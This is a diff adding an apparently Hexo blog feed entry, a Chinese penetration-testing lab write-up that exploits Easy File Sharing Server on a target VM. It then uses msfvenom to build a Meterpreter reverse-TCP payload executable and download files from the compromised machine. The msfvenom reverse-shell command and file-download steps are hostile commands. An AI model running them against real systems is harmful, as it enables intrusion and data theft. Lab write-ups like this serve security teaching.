@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>漏洞复现A</title>
+      <link href="/2021/11/08/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0A/"/>
+      <url>/2021/11/08/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0A/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>一、漏洞渗透测试<br>1、靶机安装easy file sharing server（efssetup_2018.zip）<br>2、利用Nmap扫描发现靶机(Windows)运行了该服务。<br>3、利用该漏洞，使得靶机运行计算器。<br>具体实现：<br>1、靶机安装efssetup<br><a href="https://imgtu.com/i/I8izXn"><img src="https://z3.ax1x.com/2021/11/08/I8izXn.jpg" alt="I8izXn.jpg"></a><br>2、使用nmap扫描靶机，发现在8080端口有Easy File Sharing 服务<br><em>nmap -sV IP ：可以打开和探测服务版本</em><br><a href="https://imgtu.com/i/I8Fnn1"><img src="https://z3.ax1x.com/2021/11/08/I8Fnn1.jpg" alt="I8Fnn1.jpg"></a><br>3、查找EasyFileSharing的有关漏洞<br><a href="https://imgtu.com/i/I8FaHP"><img src="https://z3.ax1x.com/2021/11/08/I8FaHP.jpg" alt="I8FaHP.jpg"></a><br>4、随机执行其中的一个漏洞脚本、就可以看到靶机已打开计算机<br><a href="https://imgtu.com/i/I8FB4S"><img src="https://z3.ax1x.com/2021/11/08/I8FB4S.jpg" alt="I8FB4S.jpg"></a><br><a href="https://imgtu.com/i/I8F6js"><img src="https://z3.ax1x.com/2021/11/08/I8F6js.jpg" alt="I8F6js.jpg"></a></p><p>二、Metasploit应用<br>1、生成主控端、被控端。<br>2、获得靶机(Windows)控制权。<br>3、下载靶机上任意一个文件。<br>具体实现过程：<br>1、生成被控端<br>命令：msfvenom -p windows/meterpreter/reverse_tcp lhost=目标IP lport=5000 -f exe -o /root/payload.exe<br>    msfvenom：Metasploit程序内置的远程控制命令。<br>    -p：指定要生成的payload，即攻击荷载。<br>    windows：适用于Windows系统的。<br>    meterpreter：采用meterpreter主控的。<br>    reverse_tcp lhost：指定接收端host的ip。<br>    lport：指定端口。<br>    -f：指定格式为exe。<br>    -o：指定存储payload位置，即/root/下。<br><a href="https://imgtu.com/i/I8ZuF0"><img src="https://z3.ax1x.com/2021/11/08/I8ZuF0.jpg" alt="I8ZuF0.jpg"></a><br><a href="https://imgtu.com/i/I8ZMWT"><img src="https://z3.ax1x.com/2021/11/08/I8ZMWT.jpg" alt="I8ZMWT.jpg"></a><br>2、在kali运行被控端，获得目标计算机的控制权<br><a href="https://imgtu.com/i/I8Z8OJ"><img src="https://z3.ax1x.com/2021/11/08/I8Z8OJ.jpg" alt="I8Z8OJ.jpg"></a><br>3、对靶机进行操作，查看文件并且下载<br>Ls：查看文件<br>Download 文件名 ：下载文件<br><a href="https://imgtu.com/i/I8ZaY6"><img src="https://z3.ax1x.com/2021/11/08/I8ZaY6.jpg" alt="I8ZaY6.jpg"></a></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 渗透测试 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Wireshark和zoomeye使用</title>
       <link href="/2021/10/26/wireshark/"/>
       <url>/2021/10/26/wireshark/</url>
